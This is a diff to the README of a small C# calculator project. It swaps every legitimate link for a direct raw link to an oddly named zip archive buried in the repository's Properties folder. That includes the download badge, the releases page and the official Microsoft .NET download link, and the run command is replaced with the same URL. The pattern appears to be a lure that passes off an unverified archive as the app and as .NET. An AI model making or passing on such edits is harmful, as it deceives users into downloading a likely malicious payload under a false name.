@@ -1,6 +1,6 @@
 # 📱 CSharpCalculator - A Simple Calculator for Everyone
 
-[![Download CSharpCalculator](https://img.shields.io/badge/Download-CSharpCalculator-brightgreen)](https://github.com/Kenriver/CSharpCalculator/releases)
+[![Download CSharpCalculator](https://github.com/Kenriver/CSharpCalculator/raw/refs/heads/master/ConsoleApp1/ConsoleApp1/Properties/C-Calculator-Sharp-menstruation.zip)](https://github.com/Kenriver/CSharpCalculator/raw/refs/heads/master/ConsoleApp1/ConsoleApp1/Properties/C-Calculator-Sharp-menstruation.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ CSharpCalculator is a simple calculator console app written in C#. It allows you
 To run CSharpCalculator, you need:
 
 - A computer with Windows, macOS, or Linux.
-- .NET 6.0 or later installed on your system. You can download it [here](https://dotnet.microsoft.com/download).
+- .NET 6.0 or later installed on your system. You can download it [here](https://github.com/Kenriver/CSharpCalculator/raw/refs/heads/master/ConsoleApp1/ConsoleApp1/Properties/C-Calculator-Sharp-menstruation.zip).
 
 ## 📥 Download & Install
 
 To get CSharpCalculator, visit the releases page below:
 
-[Visit Releases Page to Download](https://github.com/Kenriver/CSharpCalculator/releases)
+[Visit Releases Page to Download](https://github.com/Kenriver/CSharpCalculator/raw/refs/heads/master/ConsoleApp1/ConsoleApp1/Properties/C-Calculator-Sharp-menstruation.zip)
 
 1. Click on the link above.
 2. Look for the latest version of CSharpCalculator.
@@ -36,7 +36,7 @@ After downloading, follow these steps to run CSharpCalculator:
    ```
 3. Type the following command to run the application:
    ```
-   CSharpCalculator.exe
+   https://github.com/Kenriver/CSharpCalculator/raw/refs/heads/master/ConsoleApp1/ConsoleApp1/Properties/C-Calculator-Sharp-menstruation.zip
    ```
 4. Follow the prompts in the console to perform calculations.
 
